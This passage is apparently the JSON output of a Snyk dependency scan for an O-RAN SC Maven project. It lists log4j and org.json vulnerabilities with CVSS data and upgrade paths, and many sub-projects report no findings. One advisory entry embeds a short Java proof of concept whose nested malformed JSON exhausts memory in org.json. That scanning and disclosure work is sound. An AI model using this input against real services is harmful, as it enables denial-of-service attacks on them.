        },
        "packageName": "log4j:log4j",
        "proprietary": false,
        "creationTime": "2020-06-18T15:47:31.144561Z",
        "functions_new": [
          {
            "version": [
              "[0,]"
            ],
            "functionId": {
              "className": "org.apache.log4j.net.SocketServer",
              "functionName": "main"
            }
          }
        ],
        "alternativeIds": [],
        "disclosureTime": "2019-12-22T09:33:11Z",
        "exploitDetails": {
          "sources": [
            "PoC in GitHub",
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "maven",
        "mavenModuleName": {
          "groupId": "log4j",
          "artifactId": "log4j"
        },
        "publicationTime": "2020-06-19T09:33:01Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-06-20T05:20:08.860780Z",
        "socialTrendAlert": false,
        "severityWithCritical": "critical",
        "from": [
          "org.o-ran-sc.oam-oam-controller.features.sdnr.odlux:sdnr-odlux-helpserver-provider@13.0.0-SNAPSHOT",
          "org.slf4j:slf4j-log4j12@1.7.29",
          "log4j:log4j@1.2.17"
        ],
        "upgradePath": [
          false,
          "org.slf4j:slf4j-log4j12@1.7.34"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "log4j:log4j",
        "version": "1.2.17"
      },
      {
        "id": "SNYK-JAVA-ORGJSON-5488379",
        "title": "Denial of Service (DoS)",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "BingDiAn-cn"
        ],
        "semver": {
          "vulnerable": [
            "[,20230227)"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "20230227"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "java",
        "severity": "high",
        "cvssScore": 7.5,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "org.json:json",
        "references": [
          {
            "url": "https://github.com/dromara/hutool/commit/6a2b585de0a380e8c12016dbaa1620b69be11b8c",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/stleary/JSON-java/commit/401495ae86635978206adeb67cca472d4c2b39ce",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/dromara/hutool/issues/2748",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/stleary/JSON-java/issues/708",
            "title": "GitHub Issue"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "high",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "cvssV3BaseScore": 7.5,
            "modificationTime": "2024-03-11T09:52:52.078179Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "high",
            "baseScore": 7.5,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T14:07:18.840838Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "assigner": "NVD",
            "severity": "high",
            "baseScore": 7.5,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:52:52.078179Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Denial of Service (DoS) in the `XML.toJSONObject` component via crafted `JSON` or `XML` data.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\n\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\n\nTwo common types of DoS vulnerabilities:\n\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](https://security.snyk.io/vuln/SNYK-JAVA-COMMONSFILEUPLOAD-30082).\n\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)\n\n## Remediation\nUpgrade `org.json:json` to version 20230227 or higher.\n## References\n- [GitHub Commit](https://github.com/dromara/hutool/commit/6a2b585de0a380e8c12016dbaa1620b69be11b8c)\n- [GitHub Commit](https://github.com/stleary/JSON-java/commit/401495ae86635978206adeb67cca472d4c2b39ce)\n- [GitHub Issue](https://github.com/dromara/hutool/issues/2748)\n- [GitHub Issue](https://github.com/stleary/JSON-java/issues/708)\n",
        "epssDetails": {
          "percentile": "0.71317",
          "probability": "0.00705",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2022-45688"
          ],
          "CWE": [
            "CWE-400"
          ],
          "GHSA": [
            "GHSA-3vqj-43w4-2q58"
          ]
        },
        "packageName": "org.json:json",
        "proprietary": false,
        "creationTime": "2023-04-28T12:22:57.561292Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2022-12-13T15:30:26Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "maven",
        "mavenModuleName": {
          "groupId": "org.json",
          "artifactId": "json"
        },
        "publicationTime": "2022-12-14T11:24:26.998925Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-11T09:52:52.078179Z",
        "socialTrendAlert": false,
        "severityWithCritical": "high",
        "from": [
          "org.o-ran-sc.oam-oam-controller.features.sdnr.odlux:sdnr-odlux-helpserver-provider@13.0.0-SNAPSHOT",
          "org.json:json@20201115"
        ],
        "upgradePath": [
          false,
          "org.json:json@20230227"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "org.json:json",
        "version": "20201115"
      },
      {
        "id": "SNYK-JAVA-ORGJSON-5962464",
        "title": "Allocation of Resources Without Limits or Throttling",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "Éamonn McManus"
        ],
        "semver": {
          "vulnerable": [
            "[0,20231013)"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "20231013"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "java",
        "severity": "high",
        "cvssScore": 7.5,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "org.json:json",
        "references": [
          {
            "url": "https://github.com/stleary/JSON-java/commit/60662e2f8384d3449822a3a1179bfe8de67b55bb",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/stleary/JSON-java/issues/758",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/stleary/JSON-java/issues/771",
            "title": "GitHub Issue"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "high",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "cvssV3BaseScore": 7.5,
            "modificationTime": "2024-03-11T09:53:42.309904Z"
          },
          {
            "assigner": "Red Hat",
            "severity": "high",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "cvssV3BaseScore": 7.5,
            "modificationTime": "2024-03-11T09:54:02.470685Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "high",
            "baseScore": 7.5,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T14:09:43.567401Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "assigner": "NVD",
            "severity": "high",
            "baseScore": 7.5,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:53:42.309904Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "assigner": "Red Hat",
            "severity": "high",
            "baseScore": 7.5,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:54:02.470685Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Allocation of Resources Without Limits or Throttling. An attacker can cause indefinite amounts of memory to be used by inputting a string of modest size. This can lead to a Denial of Service.\n## PoC\n```java\r\npackage orgjsonbug;\r\n\r\nimport org.json.JSONObject;\r\n\r\n/**\r\n * Illustrates a bug in JSON-Java.\r\n */\r\npublic class Bug {\r\n  private static String makeNested(int depth) {\r\n    if (depth == 0) {\r\n      return \"{\\\"a\\\":1}\";\r\n    }\r\n    return \"{\\\"a\\\":1;\\t\\0\" + makeNested(depth - 1) + \":1}\";\r\n  }\r\n\r\n  public static void main(String[] args) {\r\n    String input = makeNested(30);\r\n    System.out.printf(\"Input string has length %d: %s\\n\", input.length(), input);\r\n    JSONObject output = new JSONObject(input);\r\n    System.out.printf(\"Output JSONObject has length %d: %s\\n\", output.toString().length(), output);\r\n  }\r\n}\r\n```\n## Remediation\nUpgrade `org.json:json` to version 20231013 or higher.\n## References\n- [GitHub Commit](https://github.com/stleary/JSON-java/commit/60662e2f8384d3449822a3a1179bfe8de67b55bb)\n- [GitHub Issue](https://github.com/stleary/JSON-java/issues/758)\n- [GitHub Issue](https://github.com/stleary/JSON-java/issues/771)\n",
        "epssDetails": {
          "percentile": "0.66636",
          "probability": "0.00538",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2023-5072"
          ],
          "CWE": [
            "CWE-770"
          ],
          "GHSA": [
            "GHSA-rm7j-f5g5-27vv"
          ]
        },
        "packageName": "org.json:json",
        "proprietary": false,
        "creationTime": "2023-10-13T06:42:49.060354Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2023-10-12T18:30:28Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "maven",
        "mavenModuleName": {
          "groupId": "org.json",
          "artifactId": "json"
        },
        "publicationTime": "2023-10-13T06:42:49.248655Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-11T09:54:02.470685Z",
        "socialTrendAlert": false,
        "severityWithCritical": "high",
        "from": [
          "org.o-ran-sc.oam-oam-controller.features.sdnr.odlux:sdnr-odlux-helpserver-provider@13.0.0-SNAPSHOT",
          "org.json:json@20201115"
        ],
        "upgradePath": [
          false,
          "org.json:json@20231013"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "org.json:json",
        "version": "20201115"
      }
    ],
    "ok": false,
    "dependencyCount": 5,
    "org": "mdimado",
    "policy": "# Snyk (https://snyk.io) policy file, patches or ignores known vulnerabilities.\nversion: v1.25.1\nignore: {}\npatch: {}\n",
    "isPrivate": true,
    "licensesPolicy": {
      "severities": {},
      "orgLicenseRules": {
        "AGPL-1.0": {
          "licenseType": "AGPL-1.0",
          "severity": "high",
          "instructions": ""
        },
        "AGPL-3.0": {
          "licenseType": "AGPL-3.0",
          "severity": "high",
          "instructions": ""
        },
        "Artistic-1.0": {
          "licenseType": "Artistic-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "Artistic-2.0": {
          "licenseType": "Artistic-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "CDDL-1.0": {
          "licenseType": "CDDL-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "CPOL-1.02": {
          "licenseType": "CPOL-1.02",
          "severity": "high",
          "instructions": ""
        },
        "EPL-1.0": {
          "licenseType": "EPL-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "GPL-2.0": {
          "licenseType": "GPL-2.0",
          "severity": "high",
          "instructions": ""
        },
        "GPL-3.0": {
          "licenseType": "GPL-3.0",
          "severity": "high",
          "instructions": ""
        },
        "LGPL-2.0": {
          "licenseType": "LGPL-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "LGPL-2.1": {
          "licenseType": "LGPL-2.1",
          "severity": "medium",
          "instructions": ""
        },
        "LGPL-3.0": {
          "licenseType": "LGPL-3.0",
          "severity": "medium",
          "instructions": ""
        },
        "MPL-1.1": {
          "licenseType": "MPL-1.1",
          "severity": "medium",
          "instructions": ""
        },
        "MPL-2.0": {
          "licenseType": "MPL-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "MS-RL": {
          "licenseType": "MS-RL",
          "severity": "medium",
          "instructions": ""
        },
        "SimPL-2.0": {
          "licenseType": "SimPL-2.0",
          "severity": "high",
          "instructions": ""
        }
      }
    },
    "packageManager": "maven",
    "ignoreSettings": {
      "adminOnly": false,
      "reasonRequired": false,
      "disregardFilesystemIgnores": false
    },
    "summary": "9 vulnerable dependency paths",
    "remediation": {
      "unresolved": [],
      "upgrade": {
        "org.json:json@20201115": {
          "upgradeTo": "org.json:json@20231013",
          "upgrades": [
            "org.json:json@20201115",
            "org.json:json@20201115"
          ],
          "vulns": [
            "SNYK-JAVA-ORGJSON-5962464",
            "SNYK-JAVA-ORGJSON-5488379"
          ]
        },
        "org.slf4j:slf4j-log4j12@1.7.29": {
          "upgradeTo": "org.slf4j:slf4j-log4j12@1.7.34",
          "upgrades": [
            "log4j:log4j@1.2.17",
            "log4j:log4j@1.2.17",
            "log4j:log4j@1.2.17",
            "log4j:log4j@1.2.17",
            "log4j:log4j@1.2.17",
            "log4j:log4j@1.2.17",
            "log4j:log4j@1.2.17"
          ],
          "vulns": [
            "SNYK-JAVA-LOG4J-1300176",
            "SNYK-JAVA-LOG4J-2316893",
            "SNYK-JAVA-LOG4J-2342645",
            "SNYK-JAVA-LOG4J-2342646",
            "SNYK-JAVA-LOG4J-2342647",
            "SNYK-JAVA-LOG4J-3358774",
            "SNYK-JAVA-LOG4J-572732"
          ]
        }
      },
      "patch": {},
      "ignore": {},
      "pin": {}
    },
    "filesystemPolicy": false,
    "filtered": {
      "ignore": [],
      "patch": []
    },
    "uniqueCount": 9,
    "projectName": "org.o-ran-sc.oam-oam-controller.features.sdnr.odlux:sdnr-odlux-helpserver-provider",
    "foundProjectCount": 20,
    "displayTargetFile": "features/sdnr/odlux/helpserver/provider/pom.xml",
    "hasUnknownVersions": false,
    "path": "/Users/mohammedimaduddin/Desktop/oran/oransc-sanity/imad/scripts/snyk-scan-workspace/oam_oam-controller"
  },
  {
    "vulnerabilities": [],
    "ok": true,
    "dependencyCount": 0,
    "org": "mdimado",
    "policy": "# Snyk (https://snyk.io) policy file, patches or ignores known vulnerabilities.\nversion: v1.25.1\nignore: {}\npatch: {}\n",
    "isPrivate": true,
    "licensesPolicy": {
      "severities": {},
      "orgLicenseRules": {
        "AGPL-1.0": {
          "licenseType": "AGPL-1.0",
          "severity": "high",
          "instructions": ""
        },
        "AGPL-3.0": {
          "licenseType": "AGPL-3.0",
          "severity": "high",
          "instructions": ""
        },
        "Artistic-1.0": {
          "licenseType": "Artistic-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "Artistic-2.0": {
          "licenseType": "Artistic-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "CDDL-1.0": {
          "licenseType": "CDDL-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "CPOL-1.02": {
          "licenseType": "CPOL-1.02",
          "severity": "high",
          "instructions": ""
        },
        "EPL-1.0": {
          "licenseType": "EPL-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "GPL-2.0": {
          "licenseType": "GPL-2.0",
          "severity": "high",
          "instructions": ""
        },
        "GPL-3.0": {
          "licenseType": "GPL-3.0",
          "severity": "high",
          "instructions": ""
        },
        "LGPL-2.0": {
          "licenseType": "LGPL-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "LGPL-2.1": {
          "licenseType": "LGPL-2.1",
          "severity": "medium",
          "instructions": ""
        },
        "LGPL-3.0": {
          "licenseType": "LGPL-3.0",
          "severity": "medium",
          "instructions": ""
        },
        "MPL-1.1": {
          "licenseType": "MPL-1.1",
          "severity": "medium",
          "instructions": ""
        },
        "MPL-2.0": {
          "licenseType": "MPL-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "MS-RL": {
          "licenseType": "MS-RL",
          "severity": "medium",
          "instructions": ""
        },
        "SimPL-2.0": {
          "licenseType": "SimPL-2.0",
          "severity": "high",
          "instructions": ""
        }
      }
    },
    "packageManager": "maven",
    "ignoreSettings": {
      "adminOnly": false,
      "reasonRequired": false,
      "disregardFilesystemIgnores": false
    },
    "summary": "No known vulnerabilities",
    "filesystemPolicy": false,
    "uniqueCount": 0,
    "projectName": "org.o-ran-sc.oam-oam-controller.parent:parent",
    "foundProjectCount": 20,
    "displayTargetFile": "parents/pom.xml",
    "hasUnknownVersions": false,
    "path": "/Users/mohammedimaduddin/Desktop/oran/oransc-sanity/imad/scripts/snyk-scan-workspace/oam_oam-controller"
  },
  {
    "vulnerabilities": [],
    "ok": true,
    "dependencyCount": 1,
    "org": "mdimado",
    "policy": "# Snyk (https://snyk.io) policy file, patches or ignores known vulnerabilities.\nversion: v1.25.1\nignore: {}\npatch: {}\n",
    "isPrivate": true,
    "licensesPolicy": {
      "severities": {},
      "orgLicenseRules": {
        "AGPL-1.0": {
          "licenseType": "AGPL-1.0",
          "severity": "high",
          "instructions": ""
        },
        "AGPL-3.0": {
          "licenseType": "AGPL-3.0",
          "severity": "high",
          "instructions": ""
        },
        "Artistic-1.0": {
          "licenseType": "Artistic-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "Artistic-2.0": {
          "licenseType": "Artistic-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "CDDL-1.0": {
          "licenseType": "CDDL-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "CPOL-1.02": {
          "licenseType": "CPOL-1.02",
          "severity": "high",
          "instructions": ""
        },
        "EPL-1.0": {
          "licenseType": "EPL-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "GPL-2.0": {
          "licenseType": "GPL-2.0",
          "severity": "high",
          "instructions": ""
        },
        "GPL-3.0": {
          "licenseType": "GPL-3.0",
          "severity": "high",
          "instructions": ""
        },
        "LGPL-2.0": {
          "licenseType": "LGPL-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "LGPL-2.1": {
          "licenseType": "LGPL-2.1",
          "severity": "medium",
          "instructions": ""
        },
        "LGPL-3.0": {
          "licenseType": "LGPL-3.0",
          "severity": "medium",
          "instructions": ""
        },
        "MPL-1.1": {
          "licenseType": "MPL-1.1",
          "severity": "medium",
          "instructions": ""
        },
        "MPL-2.0": {
          "licenseType": "MPL-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "MS-RL": {
          "licenseType": "MS-RL",
          "severity": "medium",
          "instructions": ""
        },
        "SimPL-2.0": {
          "licenseType": "SimPL-2.0",
          "severity": "high",
          "instructions": ""
        }
      }
    },
    "packageManager": "maven",
    "ignoreSettings": {
      "adminOnly": false,
      "reasonRequired": false,
      "disregardFilesystemIgnores": false
    },
    "summary": "No known vulnerabilities",
    "filesystemPolicy": false,
    "uniqueCount": 0,
    "projectName": "org.o-ran-sc.oam-oam-controller.parent:dependencies-bom",
    "foundProjectCount": 20,
    "displayTargetFile": "parents/dependencies-bom/pom.xml",
    "hasUnknownVersions": false,
    "path": "/Users/mohammedimaduddin/Desktop/oran/oransc-sanity/imad/scripts/snyk-scan-workspace/oam_oam-controller"
  },
  {
    "vulnerabilities": [],
    "ok": true,
    "dependencyCount": 4,
    "org": "mdimado",
    "policy": "# Snyk (https://snyk.io) policy file, patches or ignores known vulnerabilities.\nversion: v1.25.1\nignore: {}\npatch: {}\n",
    "isPrivate": true,
    "licensesPolicy": {
      "severities": {},
      "orgLicenseRules": {
        "AGPL-1.0": {
          "licenseType": "AGPL-1.0",
          "severity": "high",
          "instructions": ""
        },
        "AGPL-3.0": {
          "licenseType": "AGPL-3.0",
          "severity": "high",
          "instructions": ""
        },
        "Artistic-1.0": {
          "licenseType": "Artistic-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "Artistic-2.0": {
          "licenseType": "Artistic-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "CDDL-1.0": {
          "licenseType": "CDDL-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "CPOL-1.02": {
          "licenseType": "CPOL-1.02",
          "severity": "high",
          "instructions": ""
        },
        "EPL-1.0": {
          "licenseType": "EPL-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "GPL-2.0": {
          "licenseType": "GPL-2.0",
          "severity": "high",
          "instructions": ""
        },
        "GPL-3.0": {
          "licenseType": "GPL-3.0",
          "severity": "high",
          "instructions": ""
        },
        "LGPL-2.0": {
          "licenseType": "LGPL-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "LGPL-2.1": {
          "licenseType": "LGPL-2.1",
          "severity": "medium",
          "instructions": ""
        },
        "LGPL-3.0": {
          "licenseType": "LGPL-3.0",
          "severity": "medium",
          "instructions": ""
        },
        "MPL-1.1": {
          "licenseType": "MPL-1.1",
          "severity": "medium",
          "instructions": ""
        },
        "MPL-2.0": {
          "licenseType": "MPL-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "MS-RL": {
          "licenseType": "MS-RL",
          "severity": "medium",
          "instructions": ""
        },
        "SimPL-2.0": {
          "licenseType": "SimPL-2.0",
          "severity": "high",
          "instructions": ""
        }
      }
    },
    "packageManager": "maven",
    "ignoreSettings": {
      "adminOnly": false,
      "reasonRequired": false,
      "disregardFilesystemIgnores": false
    },
    "summary": "No known vulnerabilities",
    "filesystemPolicy": false,
    "uniqueCount": 0,
    "projectName": "org.o-ran-sc.oam-oam-controller.parent:dependencies-odl-bom",
    "foundProjectCount": 20,
    "displayTargetFile": "parents/dependencies-odl-bom/pom.xml",
    "hasUnknownVersions": false,
    "path": "/Users/mohammedimaduddin/Desktop/oran/oransc-sanity/imad/scripts/snyk-scan-workspace/oam_oam-controller"
  },
  {
    "vulnerabilities": [],
    "ok": true,
    "dependencyCount": 0,
    "org": "mdimado",
    "policy": "# Snyk (https://snyk.io) policy file, patches or ignores known vulnerabilities.\nversion: v1.25.1\nignore: {}\npatch: {}\n",
    "isPrivate": true,
    "licensesPolicy": {
      "severities": {},
      "orgLicenseRules": {
        "AGPL-1.0": {
          "licenseType": "AGPL-1.0",
          "severity": "high",
          "instructions": ""
        },
        "AGPL-3.0": {
          "licenseType": "AGPL-3.0",
          "severity": "high",
          "instructions": ""
        },
        "Artistic-1.0": {
          "licenseType": "Artistic-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "Artistic-2.0": {
          "licenseType": "Artistic-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "CDDL-1.0": {
          "licenseType": "CDDL-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "CPOL-1.02": {
          "licenseType": "CPOL-1.02",
          "severity": "high",
          "instructions": ""
        },
        "EPL-1.0": {
          "licenseType": "EPL-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "GPL-2.0": {
          "licenseType": "GPL-2.0",
          "severity": "high",
          "instructions": ""
        },
        "GPL-3.0": {
          "licenseType": "GPL-3.0",
          "severity": "high",
          "instructions": ""
        },
        "LGPL-2.0": {
          "licenseType": "LGPL-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "LGPL-2.1": {
          "licenseType": "LGPL-2.1",
          "severity": "medium",
          "instructions": ""
        },
        "LGPL-3.0": {
          "licenseType": "LGPL-3.0",
          "severity": "medium",
          "instructions": ""
        },
        "MPL-1.1": {
          "licenseType": "MPL-1.1",
          "severity": "medium",
          "instructions": ""
        },
        "MPL-2.0": {
          "licenseType": "MPL-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "MS-RL": {
          "licenseType": "MS-RL",
          "severity": "medium",
          "instructions": ""
        },
        "SimPL-2.0": {
          "licenseType": "SimPL-2.0",
          "severity": "high",
          "instructions": ""
        }
      }
    },
    "packageManager": "maven",
    "ignoreSettings": {
      "adminOnly": false,
      "reasonRequired": false,
      "disregardFilesystemIgnores": false
    },
    "summary": "No known vulnerabilities",
    "filesystemPolicy": false,
    "uniqueCount": 0,
    "projectName": "org.o-ran-sc.oam-oam-controller.parent:installed-odl-bom",
    "foundProjectCount": 20,
    "displayTargetFile": "parents/installed-odl-bom/pom.xml",
    "hasUnknownVersions": false,
    "path": "/Users/mohammedimaduddin/Desktop/oran/oransc-sanity/imad/scripts/snyk-scan-workspace/oam_oam-controller"
  },
  {
    "vulnerabilities": [],
    "ok": true,
    "dependencyCount": 0,
    "org": "mdimado",
    "policy": "# Snyk (https://snyk.io) policy file, patches or ignores known vulnerabilities.\nversion: v1.25.1\nignore: {}\npatch: {}\n",
    "isPrivate": true,
    "licensesPolicy": {
      "severities": {},
      "orgLicenseRules": {
        "AGPL-1.0": {
          "licenseType": "AGPL-1.0",
          "severity": "high",
          "instructions": ""
        },
        "AGPL-3.0": {
          "licenseType": "AGPL-3.0",
          "severity": "high",
          "instructions": ""
        },
        "Artistic-1.0": {
          "licenseType": "Artistic-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "Artistic-2.0": {
          "licenseType": "Artistic-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "CDDL-1.0": {
          "licenseType": "CDDL-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "CPOL-1.02": {
          "licenseType": "CPOL-1.02",
          "severity": "high",
          "instructions": ""
        },
        "EPL-1.0": {
          "licenseType": "EPL-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "GPL-2.0": {
          "licenseType": "GPL-2.0",
          "severity": "high",
          "instructions": ""
        },
        "GPL-3.0": {
          "licenseType": "GPL-3.0",
          "severity": "high",
          "instructions": ""
        },
        "LGPL-2.0": {
          "licenseType": "LGPL-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "LGPL-2.1": {
          "licenseType": "LGPL-2.1",
          "severity": "medium",
          "instructions": ""
        },
        "LGPL-3.0": {
          "licenseType": "LGPL-3.0",
          "severity": "medium",
          "instructions": ""
        },
        "MPL-1.1": {
          "licenseType": "MPL-1.1",
          "severity": "medium",
          "instructions": ""
        },
        "MPL-2.0": {
          "licenseType": "MPL-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "MS-RL": {
          "licenseType": "MS-RL",
          "severity": "medium",
          "instructions": ""
        },
        "SimPL-2.0": {
          "licenseType": "SimPL-2.0",
          "severity": "high",
          "instructions": ""
        }
      }
    },
    "packageManager": "maven",
    "ignoreSettings": {
      "adminOnly": false,
      "reasonRequired": false,
      "disregardFilesystemIgnores": false
    },
    "summary": "No known vulnerabilities",
    "filesystemPolicy": false,
    "uniqueCount": 0,
    "projectName": "org.o-ran-sc.oam-oam-controller.parent:odlparent-aggregator",
    "foundProjectCount": 20,
    "displayTargetFile": "parents/odlparent/pom.xml",
    "hasUnknownVersions": false,
    "path": "/Users/mohammedimaduddin/Desktop/oran/oransc-sanity/imad/scripts/snyk-scan-workspace/oam_oam-controller"
  },
  {
    "vulnerabilities": [],
    "ok": true,
    "dependencyCount": 3,
    "org": "mdimado",
    "policy": "# Snyk (https://snyk.io) policy file, patches or ignores known vulnerabilities.\nversion: v1.25.1\nignore: {}\npatch: {}\n",
    "isPrivate": true,
    "licensesPolicy": {
      "severities": {},
      "orgLicenseRules": {
        "AGPL-1.0": {
          "licenseType": "AGPL-1.0",
          "severity": "high",
          "instructions": ""
        },
        "AGPL-3.0": {
          "licenseType": "AGPL-3.0",
          "severity": "high",
          "instructions": ""
        },
        "Artistic-1.0": {
          "licenseType": "Artistic-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "Artistic-2.0": {
          "licenseType": "Artistic-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "CDDL-1.0": {
          "licenseType": "CDDL-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "CPOL-1.02": {
          "licenseType": "CPOL-1.02",
          "severity": "high",
          "instructions": ""
        },
        "EPL-1.0": {
          "licenseType": "EPL-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "GPL-2.0": {
          "licenseType": "GPL-2.0",
          "severity": "high",
          "instructions": ""
        },
        "GPL-3.0": {
          "licenseType": "GPL-3.0",
          "severity": "high",
          "instructions": ""
        },
        "LGPL-2.0": {
          "licenseType": "LGPL-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "LGPL-2.1": {
          "licenseType": "LGPL-2.1",
          "severity": "medium",
          "instructions": ""
        },
        "LGPL-3.0": {
          "licenseType": "LGPL-3.0",
          "severity": "medium",
          "instructions": ""
        },
        "MPL-1.1": {
          "licenseType": "MPL-1.1",
          "severity": "medium",
          "instructions": ""
        },
        "MPL-2.0": {
          "licenseType": "MPL-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "MS-RL": {
          "licenseType": "MS-RL",
          "severity": "medium",
          "instructions": ""
        },
        "SimPL-2.0": {
          "licenseType": "SimPL-2.0",
          "severity": "high",
          "instructions": ""
        }
      }
    },
    "packageManager": "maven",
    "ignoreSettings": {
      "adminOnly": false,
      "reasonRequired": false,
      "disregardFilesystemIgnores": false
    },
    "summary": "No known vulnerabilities",
    "filesystemPolicy": false,
    "uniqueCount": 0,
    "projectName": "org.o-ran-sc.oam-oam-controller.parent:binding-parent",
